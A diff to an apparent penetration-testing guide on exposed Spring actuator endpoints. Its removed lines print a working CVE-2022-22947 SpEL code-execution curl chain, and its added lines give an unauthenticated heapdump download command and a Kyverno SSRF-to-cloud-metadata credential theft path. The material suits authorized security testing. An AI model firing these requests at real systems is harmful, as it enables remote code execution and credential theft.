@@ -152,23 +152,22 @@ high-value endpoints:
 - `/actuator/heapdump` — downloads the full JVM heap (`.hprof`); open it in a
   memory analyzer / `strings` it for live session tokens, DB passwords, and
   API keys that never appear in `/env`. This is the highest-yield actuator.
+  **CVE-2025-48927 (TeleMessage SGNL)** is this exact primitive at scale — a
+  single unauthenticated `curl -O http://<ip>:<port>/heapdump` downloads a heap
+  containing plaintext usernames, passwords, API keys, and session tokens; CISA
+  KEV 2025-07-01 confirms active exploitation. See
+  `information_disclosure_novel_deep.md § Actuator /heapdump Public-Default`
+  for the primitive's generalization and the version/deployment-shape
+  fingerprint.
 - `/actuator/loggers`, `/actuator/threaddump`, `/actuator/mappings` — internal
   routes, and `mappings` enumerates every controller path.
-- **`/actuator/gateway/routes` (Spring Cloud Gateway) → RCE, CVE-2022-22947**
-  (affects Gateway 3.1.0 and 3.0.6-and-earlier; fixed 3.1.1 / 3.0.7). When the
-  Gateway actuator is enabled, exposed, and unsecured, POST a route whose
-  filter carries a SpEL expression, refresh, then hit the route to execute it:
-  ```bash
-  # 1) add a route with a SpEL payload in an AddResponseHeader filter
-  curl -s -X POST https://target/actuator/gateway/routes/x -H 'Content-Type: application/json' -d '{
-    "id":"x","filters":[{"name":"AddResponseHeader","args":{"name":"R",
-    "value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}],
-    "uri":"http://example.com"}'
-  curl -s -X POST https://target/actuator/gateway/refresh          # 2) apply
-  curl -si  https://target/actuator/gateway/routes/x               # 3) SpEL runs; output in header R
-  ```
-  Confirm the Gateway version before firing (it is version-specific); on a
-  patched build, describe the technique and stop.
+- **`/actuator/gateway/routes` (Spring Cloud Gateway) → RCE (CVE-2022-22947)**:
+  POST a route whose filter carries a SpEL expression, refresh, then hit the
+  route to execute it. The version-boundary metadata and the full primitive
+  recipe live in `information_disclosure_novel_deep.md § Spring Cloud Gateway
+  Actuator SpEL`; the class-shape is "an actuator endpoint that writes to the
+  runtime routing table + a filter DSL that evaluates expressions = runtime
+  code execution authored over HTTP."
 - **Jolokia** (`/actuator/jolokia`, `/jolokia`) — JMX over HTTP; can reach
   MBeans that load a remote logback config (JNDI) or trigger deserialization —
   a separate RCE path. Enumerate `list` first.
@@ -176,6 +175,26 @@ high-value endpoints:
 For an exposed Grafana/Prometheus/Alertmanager stack specifically (data-source
 proxy SSRF, `CVE-2021-43798` file read, credential pivots), load
 `grafana_prometheus` — it is the canonical owner of that pivot chain.
+
+**Cluster-controller policy engines that convert into info-disc.** Modern
+cluster-controller runtimes (Kyverno, OPA Gatekeeper, custom webhook
+frameworks, admission-time CEL / Rego / scripting hosts) run their policy
+evaluation under the controller pod's identity — not the policy author's — so
+a namespace-scoped user who can create policies gains the controller's
+cluster-wide reach whenever a policy expression can emit side effects. The
+canonical 2026 instance is **CVE-2026-4789 (Kyverno, SSRF via CEL
+`http.Lib()`)**: `http.Get()/http.Post()` from a `NamespacedValidatingPolicy`
+executes as a network call from the Kyverno pod, which reaches internal
+services across namespaces (`http://svc.other-ns.svc.cluster.local`) and the
+cloud IMDS at `169.254.169.254` to exfiltrate the controller's IAM credentials.
+The *mechanism* is SSRF (owned by `ssrf.md § Cloud IMDS Exfiltration`); the
+*information-disclosure angle* is the class abstraction — **namespace-scoped
+policy privilege converts to cluster-wide service discovery and cloud-identity
+exfiltration via a network call that bypasses Kubernetes RBAC because RBAC
+gates API calls, not network calls**. See
+`information_disclosure_novel_deep.md § Cluster-Controller Pod-Identity RBAC
+Bypass` for the version-boundary metadata and the hunt pattern that
+generalizes across policy engines.
 
 ### Cross-Origin Signals
 
